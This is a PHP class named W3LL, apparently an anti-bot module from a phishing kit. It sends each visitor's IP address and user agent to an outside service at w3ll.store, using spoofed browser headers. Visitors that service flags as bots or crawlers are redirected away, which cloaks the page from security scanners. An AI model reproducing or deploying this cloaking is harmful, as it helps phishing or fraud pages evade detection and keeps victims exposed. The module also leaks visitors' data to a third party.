<?php

class W3LL
{
    protected $server = "https://w3ll.store";
    protected $active;
    protected $bot;
    function __construct($config = array())
    {
        $this->active = $config["active"];
        $this->apikey = $config["apikey"];
        $this->bot = $config["bot_redirect"];
    }
    function get_client_ip()
    {
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
            $_SERVER["REMOTE_ADDR"] = $_SERVER["HTTP_CF_CONNECTING_IP"];
            $_SERVER["HTTP_CLIENT_IP"] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }
        $client = @$_SERVER["HTTP_CLIENT_IP"];
        $forward = @$_SERVER["HTTP_X_FORWARDED_FOR"];
        $remote = $_SERVER["REMOTE_ADDR"];
        if (filter_var($client, FILTER_VALIDATE_IP)) {
            $ip = $client;
        } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
            $ip = $forward;
        } else {
            $ip = $remote;
        }
        return $ip;
    }
    function httpGet($url)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);
        return $response;
    }
    function check()
    {
        $ip = $this->get_client_ip();
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://w3ll.store/api/crawlers/bot-check?ip=" . $ip . "&ua=" . urlencode($_SERVER["HTTP_USER_AGENT"]));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
        curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate");
        $headers = array();
        $headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0";
        $headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
        $headers[] = "Accept-Language: en-US,en;q=0.5";
        $headers[] = "Connection: keep-alive";
        $headers[] = "Upgrade-Insecure-Requests: 1";
        $headers[] = "Sec-Fetch-Dest: document";
        $headers[] = "Sec-Fetch-Mode: navigate";
        $headers[] = "Sec-Fetch-Site: none";
        $headers[] = "Sec-Fetch-User: ?1";
        $headers[] = "Cache-Control: max-age=0";
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $result = curl_exec($ch);
        if (curl_errno($ch)) {
            echo "Error:" . curl_error($ch);
        }
        curl_close($ch);
        $json = json_decode($result);
        if ($json->is_bot) {
            return true;
        } else {
            return false;
        }
    }
    function run()
    {
        if ($this->active == true) {
            if ($this->check() == true) {
                die(header("location: " . $this->bot));
            }
        }
    }
}
